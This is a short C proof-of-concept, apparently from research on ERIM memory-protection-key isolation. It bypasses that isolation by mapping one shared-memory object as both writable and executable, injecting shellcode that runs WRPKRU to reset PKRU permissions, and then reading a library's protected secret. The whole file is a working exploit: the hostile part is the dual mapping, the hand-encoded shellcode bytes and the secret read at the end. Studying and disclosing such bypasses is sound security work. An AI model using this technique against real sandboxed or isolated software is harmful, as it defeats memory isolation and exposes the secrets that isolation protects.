#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>

#include <erim.h>

#include "secure_lib.h"

int main(int argc, char **argv) {
    secure_lib_init();
    secure_lib_print_secret();


    shm_unlink("erim_bypass"); // ensure a clean slate
    int fd = shm_open("erim_bypass", O_RDWR|O_CREAT, 0777);
    int fdro = shm_open("erim_bypass", O_RDONLY, 0);

    printf("fd = %d\n", fd);
    printf("fdro = %d\n", fdro);

    int r = ftruncate(fd, 4096);
    printf("ftruncate(%d, 4096) = %d\n", fd, r);

    void *exec_page = mmap(NULL, 4096, PROT_READ|PROT_EXEC, MAP_SHARED, fdro, 0);
    void *write_page = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);

    *(int*)write_page = 0xc3;

    void (*fun_ptr)(void) = exec_page;
    fun_ptr();

    fprintf(stderr, "successfully executed mapped page once\n");

    unsigned char buf2[128] = {
        0x50, 0x52, 0x51, // push rax, rdx, rcx
        0x31, 0xc9,  // xor ecx, ecx
        0x31, 0xd2,  // xor edx, edx
        0xb8, 0x50, 0x55, 0x55, 0x55, // mov eax,0x55555550
        0x0f, 0x01, 0xef, // wrpku
        0x59, 0x5a, 0x58, // pop rcx, rdx, rax
        0xc3, // ret
        0
    };

    memcpy(write_page, buf2, sizeof(buf2));

    fun_ptr();

    fprintf(stderr, "successfully executed mapped page again\n");
    fprintf(stderr, "TRYING TO STEAL THE SECRET: %s\n", secure_lib_secret);

    return 0;
}

